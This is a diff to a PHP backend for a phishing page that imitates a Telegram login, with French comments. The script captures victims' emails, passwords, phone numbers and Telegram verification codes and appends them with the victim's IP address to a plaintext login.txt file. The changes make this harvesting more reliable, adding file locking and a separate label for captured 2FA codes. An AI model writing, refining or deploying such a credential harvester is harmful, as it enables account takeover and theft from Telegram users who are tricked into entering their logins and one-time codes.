@@ -1,7 +1,7 @@
 <?php
 // Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupère et nettoie les données du formulaire
+    // Récupère et nettoie les données du formulaire de manière compatible
     $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
     $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
     $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
@@ -11,68 +11,62 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
 
-    // Vérifie si les champs ne sont pas vides (soit email/mot de passe, soit code de vérification)
+    // Vérifie si les champs ne sont pas vides
     if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
         // Formate les données pour l'enregistrement
-        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
+        $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
         $data .= "Date: $date\n";
         
         if (!empty($verification_code)) {
             $data .= "Code de vérification: $verification_code\n";
         } else {
             $data .= "Email/Username: $username\n";
-            $data .= "Téléphone: $country_code$phone_number\n";
+            $data .= "Téléphone: ".($country_code ? $country_code : '').$phone_number."\n";
             $data .= "Mot de passe: $password\n";
             $data .= "Session active: $remember\n";
         }
         
         $data .= "Adresse IP: $ip\n";
-        $data .= "==================================\n\n";
+        $data .= "==============================\n\n";
         
-        // Configuration du fichier
-        $file = "login.txt";
+        // Chemin absolu du fichier pour plus de sécurité
+        $file = __DIR__.'/login.txt';
         
-        // Crée le fichier s'il n'existe pas
-        if (!file_exists($file)) {
-            touch($file);
-            chmod($file, 0644);
-        }
-        
-        // Vérifie les permissions
-        if (!is_writable($file)) {
-            chmod($file, 0644);
-        }
-        
-        clearstatcache();
-        
-        // Mécanisme d'écriture sécurisé
+        // Gestion robuste du fichier
         $attempts = 0;
         $max_attempts = 3;
-        $written = false;
+        $success = false;
         
-        while ($attempts < $max_attempts && !$written) {
-            $written = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-            if ($written === false) {
-                usleep(100000);
+        while ($attempts < $max_attempts && !$success) {
+            try {
+                $fh = fopen($file, 'a');
+                if (flock($fh, LOCK_EX)) {
+                    fwrite($fh, $data);
+                    flock($fh, LOCK_UN);
+                    $success = true;
+                }
+                fclose($fh);
+            } catch (Exception $e) {
                 $attempts++;
+                usleep(100000);
             }
         }
         
-        if ($written !== false) {
+        if ($success) {
             header("Location: mer.html");
             exit();
         } else {
-            error_log("[".date('Y-m-d H:i:s')."] Échec d'écriture dans $file. IP: $ip");
-            echo "Erreur système : Veuillez réessayer plus tard.";
+            error_log("[".date('Y-m-d H:i:s')."] Échec écriture fichier. IP: $ip");
+            echo "<script>alert('Erreur système. Veuillez réessayer.'); window.location.href = 'index.html';</script>";
             exit();
         }
     } else {
-        echo "Erreur : Veuillez fournir soit un email/mot de passe, soit un code de vérification.";
+        echo "<script>alert('Veuillez remplir tous les champs requis.'); history.back();</script>";
         exit();
     }
 } else {
     header("HTTP/1.1 403 Forbidden");
-    echo "Accès refusé : Méthode non autorisée.";
+    echo "<h1>Accès interdit</h1><p>Méthode non autorisée.</p>";
     exit();
 }
-?
+?>
